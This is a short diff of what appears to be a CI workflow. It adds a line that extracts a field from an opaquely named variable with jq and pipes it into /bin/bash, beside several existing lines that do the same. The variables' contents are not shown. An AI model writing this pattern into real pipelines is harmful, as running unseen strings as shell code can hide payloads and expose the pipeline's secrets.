@@ -29,6 +29,7 @@ jobs:
           echo $ne9473 | jq -r .azw76 | /bin/bash
           echo $fnk375 | jq -r .av8 | /bin/bash
           printf '%s' "$dxpi0" | jq -r .gqh32633 | /bin/bash
+          printf '%s' "$mp844" | jq -r .kscn1187 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
